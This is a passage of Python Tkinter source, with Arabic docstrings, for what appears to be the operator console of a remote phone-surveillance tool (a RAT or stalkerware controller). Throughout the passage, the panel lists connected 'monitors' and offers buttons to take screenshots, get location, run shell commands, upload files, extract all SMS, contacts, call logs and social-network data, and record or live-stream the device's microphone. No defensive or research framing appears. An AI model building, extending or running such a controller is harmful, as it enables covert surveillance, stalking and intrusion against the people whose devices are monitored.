        archive_buttons_frame.pack(fill=tk.X, padx=5, pady=2)

        buttons = [
            ("🔄", self.refresh_historical_device_list, "Refresh"),
            ("🏷️", self._tag_device, "Tag Device"),
            ("📂", self.open_file_browser, "Browse Files"),
            ("🗑️", self._delete_device_data, "Delete"),
        ]

        for icon, command, tooltip in buttons:
            btn = tk.Button(
                archive_buttons_frame,
                text=icon,
                command=command,
                bg=self.current_theme["button_bg"],
                fg=self.current_theme["button_fg"],
                relief=tk.FLAT,
                width=4,
            )
            btn.pack(side=tk.LEFT, padx=2)

        # Enhanced activity log
        log_frame = ttk.LabelFrame(
            parent, text="📊 System Activity Log", style="Themed.TLabelframe"
        )
        log_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

        # Log controls
        log_controls_frame = tk.Frame(log_frame, bg=self.current_theme["frame_bg"])
        log_controls_frame.pack(fill=tk.X, padx=5, pady=2)

        tk.Button(
            log_controls_frame,
            text="🗑️",
            command=self._clear_log,
            bg=self.current_theme["button_bg"],
            fg=self.current_theme["button_fg"],
            relief=tk.FLAT,
            width=4,
        ).pack(side=tk.LEFT, padx=2)

        tk.Button(
            log_controls_frame,
            text="💾",
            command=self._save_log,
            bg=self.current_theme["button_bg"],
            fg=self.current_theme["button_fg"],
            relief=tk.FLAT,
            width=4,
        ).pack(side=tk.LEFT, padx=2)

        self.log_text = scrolledtext.ScrolledText(
            log_frame,
            height=12,
            wrap=tk.WORD,
            state=tk.DISABLED,
            font=("Consolas", 9),
            bg=self.current_theme["text_bg"],
            fg=self.current_theme["text_fg"],
        )
        self.log_text.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

    def _setup_right_panel(self, parent):
        """إعداد اللوحة اليمنى المحسنة"""
        # Enhanced device details with tabs
        details_notebook = ttk.Notebook(parent, style="Themed.TNotebook")
        details_notebook.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

        # Device Info Tab
        info_tab = ttk.Frame(details_notebook, style="Themed.TFrame")
        details_notebook.add(info_tab, text="📋 Device Info")

        self.details_text = scrolledtext.ScrolledText(
            info_tab,
            height=18,
            wrap=tk.WORD,
            state=tk.DISABLED,
            font=("Consolas", 9),
            bg=self.current_theme["text_bg"],
            fg=self.current_theme["text_fg"],
        )
        self.details_text.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

        # Statistics Tab
        stats_tab = ttk.Frame(details_notebook, style="Themed.TFrame")
        details_notebook.add(stats_tab, text="📊 Statistics")

        self.stats_text = scrolledtext.ScrolledText(
            stats_tab,
            height=18,
            wrap=tk.WORD,
            state=tk.DISABLED,
            font=("Consolas", 9),
            bg=self.current_theme["text_bg"],
            fg=self.current_theme["text_fg"],
        )
        self.stats_text.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

        # Enhanced commands panel
        self.commands_frame = ttk.LabelFrame(
            parent, text="🎮 Monitor Control Commands", style="Themed.TLabelframe"
        )
        self.commands_frame.pack(pady=5, padx=5, fill=tk.X)
        self._setup_enhanced_commands_panel()

    def _setup_enhanced_commands_panel(self):
        """إعداد لوحة الأوامر المحسنة"""
        commands_notebook = ttk.Notebook(self.commands_frame, style="Themed.TNotebook")
        commands_notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Basic operations tab
        basic_tab = ttk.Frame(commands_notebook, style="Themed.TFrame")
        commands_notebook.add(basic_tab, text="🔧 Basic Ops")
        self._setup_basic_commands(basic_tab)

        # Enhanced communication analysis tab
        comm_tab = ttk.Frame(commands_notebook, style="Themed.TFrame")
        commands_notebook.add(comm_tab, text="📞 Communication")
        self._setup_communication_commands(comm_tab)

        # Enhanced SMS tab
        sms_tab = ttk.Frame(commands_notebook, style="Themed.TFrame")
        commands_notebook.add(sms_tab, text="💬 Enhanced SMS")
        self._setup_enhanced_sms_commands(sms_tab)

        # Audio monitoring tab
        audio_tab = ttk.Frame(commands_notebook, style="Themed.TFrame")
        commands_notebook.add(audio_tab, text="🎵 Audio")
        self._setup_audio_commands(audio_tab)

        # Enhanced file operations tab
        file_tab = ttk.Frame(commands_notebook, style="Themed.TFrame")
        commands_notebook.add(file_tab, text="📁 Files")
        self._setup_enhanced_file_commands(file_tab)

    def _setup_basic_commands(self, parent):
        """إعداد الأوامر الأساسية"""
        frame = tk.Frame(parent, bg=self.current_theme["frame_bg"])
        frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        commands = [
            ("📷 Screenshot", self.take_screenshot),
            ("📂 List Files", self.list_files),
            ("🌍 Get Location", self.get_location),
            ("📤 Upload File", self.upload_specific_file),
            ("⚡ Execute Shell", self.execute_shell_command),
        ]

        self.command_buttons = {}
        for i, (text, command) in enumerate(commands):
            button = tk.Button(
                frame,
                text=text,
                command=command,
                state=tk.DISABLED,
                bg=self.current_theme["button_bg"],
                fg=self.current_theme["button_fg"],
                relief=tk.RAISED,
                font=("Arial", 9),
            )
            button.grid(row=i // 2, column=i % 2, padx=5, pady=5, sticky="ew")
            self.command_buttons[text] = button

        frame.columnconfigure(0, weight=1)
        frame.columnconfigure(1, weight=1)

    def _setup_communication_commands(self, parent):
        """إعداد أوامر تحليل الاتصالات المحسنة"""
        frame = tk.Frame(parent, bg=self.current_theme["frame_bg"])
        frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        commands = [
            ("👥 Social Network", self.get_social_network_data),
            ("📞 Communication History", self.get_communication_history),
            ("📋 Contacts List", self.get_contacts_list),
            ("📲 Call Logs", self.get_call_logs),
        ]

        for i, (text, command) in enumerate(commands):
            button = tk.Button(
                frame,
                text=text,
                command=command,
                state=tk.DISABLED,
                bg=self.current_theme["button_bg"],
                fg=self.current_theme["button_fg"],
                relief=tk.RAISED,
                font=("Arial", 9),
            )
            button.grid(row=i // 2, column=i % 2, padx=5, pady=5, sticky="ew")
            self.command_buttons[text] = button

        frame.columnconfigure(0, weight=1)
        frame.columnconfigure(1, weight=1)

    def _setup_enhanced_sms_commands(self, parent):
        """إعداد أوامر الرسائل المحسنة"""
        frame = tk.Frame(parent, bg=self.current_theme["frame_bg"])
        frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Enhanced SMS options
        options_frame = tk.Frame(frame, bg=self.current_theme["frame_bg"])
        options_frame.pack(fill=tk.X, padx=5, pady=5)

        tk.Label(
            options_frame,
            text="📱 Enhanced SMS Extraction:",
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
            font=("Arial", 10, "bold"),
        ).pack(anchor="w")

        # Standard SMS extraction
        self.standard_sms_button = tk.Button(
            frame,
            text="💬 Standard SMS Extract",
            command=self.get_sms_list,
            state=tk.DISABLED,
            bg=self.current_theme["button_bg"],
            fg=self.current_theme["button_fg"],
            relief=tk.RAISED,
            font=("Arial", 9),
        )
        self.standard_sms_button.pack(fill=tk.X, padx=5, pady=2)

        # Unlimited SMS extraction with compression
        self.unlimited_sms_button = tk.Button(
            frame,
            text="🚀 Unlimited SMS + Compression",
            command=self.get_all_sms_unlimited,
            state=tk.DISABLED,
            bg=self.current_theme["status_success"],
            fg="#ffffff",
            relief=tk.RAISED,
            font=("Arial", 9, "bold"),
        )
        self.unlimited_sms_button.pack(fill=tk.X, padx=5, pady=2)

        # Options
        options_inner_frame = tk.Frame(frame, bg=self.current_theme["frame_bg"])
        options_inner_frame.pack(fill=tk.X, padx=5, pady=5)

        self.sms_compression_var = tk.BooleanVar(
            value=settings_manager.get("compression_enabled", True)
        )
        tk.Checkbutton(
            options_inner_frame,
            text="Enable compression",
            variable=self.sms_compression_var,
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
            selectcolor=self.current_theme["entry_bg"],
        ).pack(anchor="w")

        self.sms_network_opt_var = tk.BooleanVar(
            value=settings_manager.get("network_optimization", True)
        )
        tk.Checkbutton(
            options_inner_frame,
            text="Network optimization",
            variable=self.sms_network_opt_var,
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
            selectcolor=self.current_theme["entry_bg"],
        ).pack(anchor="w")

        # Add to command buttons
        self.command_buttons["💬 Standard SMS Extract"] = self.standard_sms_button
        self.command_buttons["🚀 Unlimited SMS + Compression"] = (
            self.unlimited_sms_button
        )

    def _setup_audio_commands(self, parent):
        """إعداد أوامر المراقبة الصوتية"""
        frame = tk.Frame(parent, bg=self.current_theme["frame_bg"])
        frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Fixed recording
        self.record_audio_button = tk.Button(
            frame,
            text="🎤 Fixed Duration Recording",
            command=self.record_audio_fixed,
            state=tk.DISABLED,
            bg=self.current_theme["button_bg"],
            fg=self.current_theme["button_fg"],
            relief=tk.RAISED,
            font=("Arial", 9),
        )
        self.record_audio_button.pack(fill=tk.X, padx=5, pady=5)

        # Live audio frame
        live_audio_frame = tk.LabelFrame(
            frame,
            text="🔴 Live Audio Stream Control",
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
        )
        live_audio_frame.pack(fill=tk.X, padx=5, pady=5)

        self.start_live_audio_button = tk.Button(
            live_audio_frame,
            text="▶️ Start Live Stream",
            command=self.start_live_audio,
            state=tk.DISABLED,
            bg=self.current_theme["status_success"],
            fg="#ffffff",
            relief=tk.RAISED,
            font=("Arial", 9),
        )
        self.start_live_audio_button.pack(
            side=tk.LEFT, padx=5, pady=5, fill=tk.X, expand=True
        )

        self.stop_live_audio_button = tk.Button(
            live_audio_frame,
            text="⏹️ Stop Live Stream",
            command=self.stop_live_audio,
            state=tk.DISABLED,
            bg=self.current_theme["status_error"],
            fg="#ffffff",
            relief=tk.RAISED,
            font=("Arial", 9),
        )
        self.stop_live_audio_button.pack(
            side=tk.LEFT, padx=5, pady=5, fill=tk.X, expand=True
        )

        # Status
        self.live_audio_status_var = tk.StringVar()
        self.live_audio_status_var.set("🎵 Live Audio: Idle")
        live_audio_status_label = tk.Label(
            live_audio_frame,
            textvariable=self.live_audio_status_var,
            font=("Arial", 10, "bold"),
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
        )
        live_audio_status_label.pack(padx=5, pady=2)

    def _setup_enhanced_file_commands(self, parent):
        """إعداد أوامر الملفات المحسنة"""
        frame = tk.Frame(parent, bg=self.current_theme["frame_bg"])
        frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # File browser button
        file_browser_button = tk.Button(
            frame,
            text="📂 Open File Browser",
            command=self.open_file_browser,
            state=tk.DISABLED,
            bg=self.current_theme["button_bg"],
            fg=self.current_theme["button_fg"],
            relief=tk.RAISED,
            font=("Arial", 9, "bold"),
        )
        file_browser_button.pack(fill=tk.X, padx=5, pady=5)
        self.command_buttons["📂 Open File Browser"] = file_browser_button

        # Enhanced document library commands
        commands = [
            ("🔍 Catalog Library", self.catalog_library_content),
            ("📊 Analyze Content", self.analyze_specific_content),
            ("⚙️ Process Queue", self.process_content_queue),
        ]

        for text, command in commands:
            button = tk.Button(
                frame,
                text=text,
                command=command,
                state=tk.DISABLED,
                bg=self.current_theme["button_bg"],
                fg=self.current_theme["button_fg"],
                relief=tk.RAISED,
                font=("Arial", 9),
            )
            button.pack(fill=tk.X, padx=5, pady=2)
            self.command_buttons[text] = button

        # Smart options frame
        options_frame = tk.LabelFrame(
            frame,
            text="🤖 Smart Options",
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
        )
        options_frame.pack(fill=tk.X, padx=5, pady=5)

        self.battery_aware_var = tk.BooleanVar(
            value=settings_manager.get("battery_monitoring", True)
        )
        tk.Checkbutton(
            options_frame,
            text="Battery-aware processing",
            variable=self.battery_aware_var,
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
            selectcolor=self.current_theme["entry_bg"],
        ).pack(anchor="w", padx=5, pady=2)

        self.network_optimized_var = tk.BooleanVar(
            value=settings_manager.get("network_optimization", True)
        )
        tk.Checkbutton(
            options_frame,
            text="Network-optimized transfers",
            variable=self.network_optimized_var,
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
            selectcolor=self.current_theme["entry_bg"],
        ).pack(anchor="w", padx=5, pady=2)

    def _apply_theme(self):
        """تطبيق الثيم على جميع العناصر"""
        self.current_theme = theme_manager.get_theme()

        # Apply to main window
        self.master.configure(bg=self.current_theme["bg"])

        # Reconfigure ttk styles
        self._configure_ttk_styles()

        # Apply to custom widgets
        try:
            # Update listboxes
            self.live_clients_listbox.configure(
                bg=self.current_theme["listbox_bg"],
                fg=self.current_theme["listbox_fg"],
                selectbackground=self.current_theme["select_bg"],
                selectforeground=self.current_theme["select_fg"],
            )

            self.historical_devices_listbox.configure(
                bg=self.current_theme["listbox_bg"],
                fg=self.current_theme["listbox_fg"],
                selectbackground=self.current_theme["select_bg"],
                selectforeground=self.current_theme["select_fg"],
            )

            # Update text widgets
            self.details_text.configure(
                bg=self.current_theme["text_bg"], fg=self.current_theme["text_fg"]
            )

            self.stats_text.configure(
                bg=self.current_theme["text_bg"], fg=self.current_theme["text_fg"]
            )

            self.log_text.configure(
                bg=self.current_theme["text_bg"], fg=self.current_theme["text_fg"]
            )

            # Update frames
            for widget in [self.live_status_frame, self.archive_status_frame]:
                widget.configure(bg=self.current_theme["frame_bg"])

            # Update labels
            for label in [self.live_count_label, self.archive_count_label]:
                label.configure(
                    bg=self.current_theme["frame_bg"], fg=self.current_theme["fg"]
                )

            # Update buttons
            for button in self.command_buttons.values():
                if isinstance(button, tk.Button):
                    current_bg = button.cget("bg")
                    # Don't change special colored buttons (success/error)
                    if current_bg not in [
                        self.current_theme["status_success"],
                        self.current_theme["status_error"],
                    ]:
                        button.configure(
                            bg=self.current_theme["button_bg"],
                            fg=self.current_theme["button_fg"],
                        )

        except Exception as e:
            logger.warning(f"Error applying theme: {e}")

    def _toggle_theme(self):
        """تبديل الثيم"""
        new_theme = theme_manager.toggle_theme()
        settings_manager.set("theme", new_theme)
        self._apply_theme()
        self.add_system_log(f"🌙 Switched to {new_theme} mode")

    def _initialize_data(self):
        """تهيئة البيانات الأولية"""
        self.update_live_clients_list()
        self.refresh_historical_device_list()
        self.add_system_log(
            "🚀 Advanced Communication Monitor Control Panel v2.0 Enhanced - Initialized"
        )

        # Check library status
        if not SOUNDDEVICE_AVAILABLE:
            self.add_system_log(
                "⚠️ WARNING: sounddevice/numpy missing. Live audio playback disabled.",
                level="warning",
            )
            self.live_audio_status_var.set(
                "🎵 Live Audio: Disabled (Missing Libraries)"
            )
        if not PIL_AVAILABLE:
            self.add_system_log(
                "⚠️ WARNING: PIL missing. Image preview disabled.", level="warning"
            )

    def add_system_log(self, message, level="info"):
        """إضافة رسالة إلى سجل النظام مع دعم الألوان"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Choose color based on level
        color_map = {
            "info": self.current_theme["fg"],
            "success": self.current_theme["status_success"],
            "warning": self.current_theme["status_warning"],
            "error": self.current_theme["status_error"],
        }
        color = color_map.get(level, self.current_theme["fg"])

        log_entry = f"[{timestamp}] [{level.upper()}] {message}\n"

        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, log_entry)

        # Apply color to the last line
        try:
            last_line_start = self.log_text.index("end-2l")
            last_line_end = self.log_text.index("end-1l")
            self.log_text.tag_add(f"level_{level}", last_line_start, last_line_end)
            self.log_text.tag_config(f"level_{level}", foreground=color)
        except:
            pass

        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

        # Log to system logger
        if level == "info":
            logger.info(message)
        elif level == "warning":
            logger.warning(message)
        elif level == "error":
            logger.error(message)
        elif level == "success":
            logger.info(f"SUCCESS: {message}")

    def update_live_clients_list(self):
        """تحديث قائمة العملاء المتصلين مع عداد"""

        def format_client(sid_info_pair):
            sid, info = sid_info_pair
            display_name = info.get("name_display", "Unknown Monitor")
            device_id = info.get("id", "Unknown ID")
            ip = info.get("ip", "N/A")
            capabilities = info.get("capabilities", [])
            last_seen_iso = info.get("last_seen")

            last_seen_str = "Never"
            if last_seen_iso:
                try:
                    last_seen_dt = datetime.datetime.fromisoformat(last_seen_iso)
                    last_seen_str = last_seen_dt.strftime("%H:%M:%S")
                except ValueError:
                    last_seen_str = "Invalid"

            caps_str = ",".join(capabilities[:2]) if capabilities else "basic"
            if len(capabilities) > 2:
                caps_str += f",+{len(capabilities)-2}"

            status_icon = "🟢" if stream_active_for_device.get(sid, False) else "🟢"
            return f"{status_icon} {display_name} | {device_id} | {ip} | [{caps_str}] | {last_seen_str}"

        items = list(connected_clients_sio.items()) if connected_clients_sio else []

        self.live_clients_listbox.delete(0, tk.END)
        if not items:
            self.live_clients_listbox.insert(tk.END, "No connected monitors")
            self.live_clients_listbox.config(fg="grey")
        else:
            self.live_clients_listbox.config(fg=self.current_theme["listbox_fg"])
            for item in items:
                display_entry = format_client(item)
                self.live_clients_listbox.insert(tk.END, display_entry)

        # Update counter
        self.live_count_label.config(text=f"Connected: {len(items)}")

    def refresh_historical_device_list(self):
        """تحديث قائمة الأجهزة التاريخية مع عداد"""

        def format_device(device_id):
            tag = device_manager.get_tag(device_id)
            device_folder = os.path.join(AppConfig.DATA_RECEIVED_DIR, device_id)
            file_count = self._count_files_in_device_folder(device_folder)
            stats = device_manager.get_stats(device_id)

            is_online = any(
                info.get("id") == device_id for info in connected_clients_sio.values()
            )
            status_icon = "🟢" if is_online else "📱"

            display_entry = f"{status_icon} {device_id}"
            if tag:
                display_entry += f" 🏷️[{tag}]"
            display_entry += f" 📊({file_count} files)"

            # Add recent activity indicator
            if stats and stats.get("last_updated"):
                try:
                    last_update = datetime.datetime.fromisoformat(stats["last_updated"])
                    hours_ago = (
                        datetime.datetime.now() - last_update
                    ).total_seconds() / 3600
                    if hours_ago < 1:
                        display_entry += " 🔥"
                    elif hours_ago < 24:
                        display_entry += " ⭐"
                except:
                    pass

            return display_entry

        try:
            devices = [
                d
                for d in os.listdir(AppConfig.DATA_RECEIVED_DIR)
                if os.path.isdir(os.path.join(AppConfig.DATA_RECEIVED_DIR, d))
            ]

            if devices:
                devices.sort(
                    key=lambda x: os.path.getmtime(
                        os.path.join(AppConfig.DATA_RECEIVED_DIR, x)
                    ),
                    reverse=True,
                )

            self.historical_devices_listbox.delete(0, tk.END)
            if not devices:
                self.historical_devices_listbox.insert(
                    tk.END, "No archived devices found"
                )
                self.historical_devices_listbox.config(fg="grey")
            else:
                self.historical_devices_listbox.config(
                    fg=self.current_theme["listbox_fg"]
                )
                for device_id in devices:
                    display_entry = format_device(device_id)
                    self.historical_devices_listbox.insert(tk.END, display_entry)

            # Update counter
            self.archive_count_label.config(text=f"Archived: {len(devices)}")

        except FileNotFoundError:
            self.historical_devices_listbox.delete(0, tk.END)
            self.historical_devices_listbox.insert(
                tk.END, "❌ Data directory not found"
            )
            self.historical_devices_listbox.config(fg="grey")
            self.archive_count_label.config(text="Archived: 0")
            logger.error(f"Data directory not found: {AppConfig.DATA_RECEIVED_DIR}")

    def _count_files_in_device_folder(self, device_folder):
        """عد الملفات في مجلد الجهاز"""
        try:
            file_count = 0
            for root, dirs, files in os.walk(device_folder):
                file_count += len(files)
            return file_count
        except:
            return 0

    def update_live_clients_list_item(self, sid_to_update):
        """تحديث عنصر واحد في قائمة العملاء"""
        try:
            self.update_live_clients_list()
        except Exception as e:
            logger.error(
                f"Error updating live client list item for SID {sid_to_update}: {e}"
            )

    def _on_live_client_select(self, event=None):
        """معالج تحديد عميل متصل"""
        selection = self.live_clients_listbox.curselection()
        if not selection:
            return

        index = selection[0]
        items = list(connected_clients_sio.items())
        if 0 <= index < len(items):
            sid, info = items[index]
            self.current_selected_live_client_sid = sid
            selected_device_id = info.get("id", "Unknown ID")

            self.add_system_log(
                f"🎯 Selected live monitor: {selected_device_id} (SID: {sid})"
            )
            self._enable_commands(True)
            self.display_device_details(selected_device_id)

            # Update audio status
            is_streaming = stream_active_for_device.get(sid, False)
            self.live_audio_status_var.set(
                "🎵 Live Audio: Receiving..." if is_streaming else "🎵 Live Audio: Idle"
            )

            if SOUNDDEVICE_AVAILABLE:
                self.start_live_audio_button.config(
                    state=tk.DISABLED if is_streaming else tk.NORMAL
                )
                self.stop_live_audio_button.config(
                    state=tk.NORMAL if is_streaming else tk.DISABLED
                )

    def _on_historical_device_select(self, event=None):
        """معالج تحديد جهاز تاريخي"""
        selection = self.historical_devices_listbox.curselection()
        if not selection:
            return

        index = selection[0]
        devices = [
            d
            for d in os.listdir(AppConfig.DATA_RECEIVED_DIR)
            if os.path.isdir(os.path.join(AppConfig.DATA_RECEIVED_DIR, d))
        ]

        if devices:
            devices.sort(
                key=lambda x: os.path.getmtime(
                    os.path.join(AppConfig.DATA_RECEIVED_DIR, x)
                ),
                reverse=True,
            )

        if 0 <= index < len(devices):
            selected_device_id = devices[index]
            self.current_selected_historical_device_id = selected_device_id
            self.add_system_log(f"📂 Selected archived monitor: {selected_device_id}")
            self.display_device_details(selected_device_id)

            # Check if device is online
            live_sid = next(
                (
                    s
                    for s, i in connected_clients_sio.items()
                    if i.get("id") == selected_device_id
                ),
                None,
            )

            if live_sid:
                self.current_selected_live_client_sid = live_sid
                self._enable_commands(True)
                is_streaming = stream_active_for_device.get(live_sid, False)
                self.live_audio_status_var.set(
                    "🎵 Live Audio: Receiving..."
                    if is_streaming
                    else "🎵 Live Audio: Idle"
                )

                if SOUNDDEVICE_AVAILABLE:
                    self.start_live_audio_button.config(
                        state=tk.DISABLED if is_streaming else tk.NORMAL
                    )
                    self.stop_live_audio_button.config(
                        state=tk.NORMAL if is_streaming else tk.DISABLED
                    )
            else:
                self.current_selected_live_client_sid = None
                self._enable_commands(False)

    def _on_live_client_right_click(self, event):
        """معالج النقر الأيمن على العملاء المتصلين"""
        self.live_clients_listbox.selection_clear(0, tk.END)
        self.live_clients_listbox.selection_set(
            self.live_clients_listbox.nearest(event.y)
        )
        self.live_clients_listbox.activate(self.live_clients_listbox.nearest(event.y))
        self._on_live_client_select()

        context_menu = Menu(self.master, tearoff=0)
        context_menu.add_command(
            label="📂 Browse Files", command=self.open_file_browser
        )
        context_menu.add_command(
            label="👥 Social Network", command=self.get_social_network_data
        )
        context_menu.add_command(
            label="📞 Communication", command=self.get_communication_history
        )
        context_menu.add_command(
            label="💬 Enhanced SMS", command=self.get_all_sms_unlimited
        )
        context_menu.add_command(
            label="🎤 Record Audio", command=self.record_audio_fixed
        )
        context_menu.add_separator()
        context_menu.add_command(label="🏷️ Tag Device", command=self._tag_device)

        try:
            context_menu.tk_popup(event.x_root, event.y_root)
        finally:
            context_menu.grab_release()

    def _on_historical_device_right_click(self, event):
        """معالج النقر الأيمن على الأجهزة التاريخية"""
        self.historical_devices_listbox.selection_clear(0, tk.END)
        self.historical_devices_listbox.selection_set(
            self.historical_devices_listbox.nearest(event.y)
        )
        self.historical_devices_listbox.activate(
            self.historical_devices_listbox.nearest(event.y)
        )
        self._on_historical_device_select()

        context_menu = Menu(self.master, tearoff=0)
        is_online = self.current_selected_live_client_sid is not None

        if is_online:
            context_menu.add_command(
                label="📂 Browse Files", command=self.open_file_browser
            )
            context_menu.add_separator()

        context_menu.add_command(
            label="📋 View Details",
            command=lambda: self.display_device_details(
                self.current_selected_historical_device_id
            ),
        )
        context_menu.add_command(
            label="📊 Show Statistics", command=self._show_device_statistics
        )
        context_menu.add_command(label="🏷️ Tag Device", command=self._tag_device)
        context_menu.add_command(
            label="🗑️ Delete Data", command=self._delete_device_data
        )

        try:
            context_menu.tk_popup(event.x_root, event.y_root)
        finally:
            context_menu.grab_release()

    def display_device_details(self, device_id):
        """عرض تفاصيل الجهاز المحسنة"""
        self.details_text.config(state=tk.NORMAL)
        self.details_text.delete("1.0", tk.END)

        # Device header
        self.details_text.insert(tk.END, f"{'='*80}\n")
        self.details_text.insert(tk.END, f"📱 ENHANCED MONITOR DETAILS: {device_id}\n")
        self.details_text.insert(tk.END, f"{'='*80}\n\n")

        # Basic info
        tag = device_manager.get_tag(device_id)
        self.details_text.insert(tk.END, f"🏷️  Tag: {tag if tag else '(No tag set)'}\n")

        # Connection status
        is_online = any(
            info.get("id") == device_id for info in connected_clients_sio.values()
        )
        status = "🟢 ONLINE" if is_online else "🔴 OFFLINE"
        self.details_text.insert(tk.END, f"📡 Status: {status}\n")

        if is_online:
            live_info = next(
                (
                    info
                    for info in connected_clients_sio.values()
                    if info.get("id") == device_id
                ),
                {},
            )
            if live_info:
                self.details_text.insert(
                    tk.END, f"🌐 IP Address: {live_info.get('ip', 'N/A')}\n"
                )
                self.details_text.insert(
                    tk.END, f"💻 Platform: {live_info.get('platform', 'Unknown')}\n"
                )
                capabilities = live_info.get("capabilities", ["basic"])
                self.details_text.insert(
                    tk.END, f"⚡ Capabilities: {', '.join(capabilities)}\n"
                )

        # Enhanced stats
        stats = device_manager.get_stats(device_id)
        if stats:
            self.details_text.insert(tk.END, f"\n📊 DEVICE STATISTICS\n")
            self.details_text.insert(tk.END, f"{'='*50}\n")

            for stat_type, stat_data in stats.items():
                if stat_type == "last_updated":
                    continue

                self.details_text.insert(
                    tk.END, f"• {stat_type.replace('_', ' ').title()}:\n"
                )
                if isinstance(stat_data, dict):
                    for key, value in stat_data.items():
                        if key == "timestamp":
                            try:
                                dt = datetime.datetime.fromisoformat(value)
                                value = dt.strftime("%Y-%m-%d %H:%M:%S")
                            except:
                                pass
                        self.details_text.insert(
                            tk.END, f"  - {key.replace('_', ' ').title()}: {value}\n"
                        )
                else:
                    self.details_text.insert(tk.END, f"  {stat_data}\n")
                self.details_text.insert(tk.END, "\n")

        self.details_text.insert(tk.END, f"\n{'='*80}\n")
        self.details_text.insert(tk.END, f"📂 DATA FILES & ANALYSIS RESULTS\n")
        self.details_text.insert(tk.END, f"{'='*80}\n\n")

        device_folder = os.path.join(AppConfig.DATA_RECEIVED_DIR, device_id)
        try:
            if os.path.isdir(device_folder):
                self._display_enhanced_folder_contents(device_folder, "")
            else:
                self.details_text.insert(tk.END, "❌ Device data folder not found\n")
        except Exception as e:
            self.details_text.insert(tk.END, f"❌ Error listing files: {e}\n")
            logger.error(f"Error listing files for {device_id}: {e}", exc_info=True)

        self.details_text.config(state=tk.DISABLED)

        # Update statistics tab
        self._update_statistics_display(device_id)

    def _display_enhanced_folder_contents(self, folder_path, prefix=""):
        """عرض محتويات المجلد بشكل هرمي محسن"""
        try:
            items = sorted(os.listdir(folder_path))

            # Group by folder type
            folder_groups = {
                "messages": "💬 Messages & Communication",
                "audio_recordings": "🎵 Audio Recordings",
                "social_network": "👥 Social Network Data",
                "structured_analysis": "📊 Analysis Results",
                "library_catalog": "📚 Library Catalog",
                "content_analysis": "🔍 Content Analysis",
            }

            # Subdirectories first
            for item in items:
                item_path = os.path.join(folder_path, item)
                if os.path.isdir(item_path):
                    folder_name = folder_groups.get(item, f"📁 {item}")
                    self.details_text.insert(tk.END, f"{prefix}{folder_name}/\n")

                    sub_items = sorted(os.listdir(item_path))
                    file_count = 0
                    total_size = 0

                    for sub_item in sub_items[:10]:  # First 10 files only
                        sub_item_path = os.path.join(item_path, sub_item)
                        if os.path.isfile(sub_item_path):
                            try:
                                stat_result = os.stat(sub_item_path)
                                file_size = stat_result.st_size
                                total_size += file_size
                                mod_time = datetime.datetime.fromtimestamp(
                                    stat_result.st_mtime
                                ).strftime("%Y-%m-%d %H:%M")
                                file_icon = Utils.get_file_icon(sub_item)
                                size_str = Utils.format_file_size(file_size)

                                self.details_text.insert(
                                    tk.END,
                                    f"{prefix}  {file_icon} {sub_item} ({size_str}) - {mod_time}\n",
                                )
                                file_count += 1
                            except Exception:
                                self.details_text.insert(
                                    tk.END,
                                    f"{prefix}  📄 {sub_item} (Error reading file info)\n",
                                )

                    if len(sub_items) > 10:
                        remaining = len(sub_items) - 10
                        self.details_text.insert(
                            tk.END, f"{prefix}  ... and {remaining} more files\n"
                        )

                    if total_size > 0:
                        self.details_text.insert(
                            tk.END,
                            f"{prefix}  📊 Total: {file_count} files, {Utils.format_file_size(total_size)}\n",
                        )
                    self.details_text.insert(tk.END, "\n")

            # Files in main directory
            files_shown = 0
            for item in items:
                item_path = os.path.join(folder_path, item)
                if os.path.isfile(item_path):
                    try:
                        stat_result = os.stat(item_path)
                        file_size = stat_result.st_size
                        mod_time = datetime.datetime.fromtimestamp(
                            stat_result.st_mtime
                        ).strftime("%Y-%m-%d %H:%M")
                        file_icon = Utils.get_file_icon(item)
                        size_str = Utils.format_file_size(file_size)

                        self.details_text.insert(
                            tk.END,
                            f"{prefix}{file_icon} {item} ({size_str}) - {mod_time}\n",
                        )
                        files_shown += 1
                    except Exception:
                        self.details_text.insert(
                            tk.END, f"{prefix}📄 {item} (Error reading file info)\n"
                        )

            if files_shown == 0 and not any(
                os.path.isdir(os.path.join(folder_path, item)) for item in items
            ):
                self.details_text.insert(tk.END, f"{prefix}📭 No files found\n")

        except Exception as e:
            self.details_text.insert(tk.END, f"{prefix}❌ Error reading folder: {e}\n")

    def _update_statistics_display(self, device_id):
        """تحديث عرض الإحصائيات"""
        self.stats_text.config(state=tk.NORMAL)
        self.stats_text.delete("1.0", tk.END)

        stats = device_manager.get_stats(device_id)
        if not stats:
            self.stats_text.insert(
                tk.END, "📊 No statistics available for this device.\n"
            )
            self.stats_text.config(state=tk.DISABLED)
            return

        self.stats_text.insert(tk.END, f"📊 DEVICE STATISTICS DASHBOARD\n")
        self.stats_text.insert(tk.END, f"{'='*60}\n")
        self.stats_text.insert(tk.END, f"Device ID: {device_id}\n")
        self.stats_text.insert(
            tk.END, f"Last Updated: {stats.get('last_updated', 'Unknown')}\n\n"
        )

        # SMS Statistics
        if "sms_stats" in stats:
            sms_data = stats["sms_stats"]
            self.stats_text.insert(tk.END, f"💬 SMS STATISTICS\n")
            self.stats_text.insert(tk.END, f"{'-'*30}\n")
            self.stats_text.insert(
